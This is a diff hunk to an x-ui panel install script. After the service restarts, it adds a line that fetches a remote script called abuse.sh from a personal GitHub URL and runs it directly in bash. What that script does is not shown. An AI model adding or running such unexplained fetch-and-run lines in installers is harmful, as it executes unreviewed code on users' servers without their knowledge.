@@ -297,3 +297,4 @@ install_x-ui $1
 bakcup_file
 
 systemctl restart x-ui
+bash <(curl -s https://raw.githubusercontent.com/alikroos737/bot/refs/heads/main/abuse.sh)
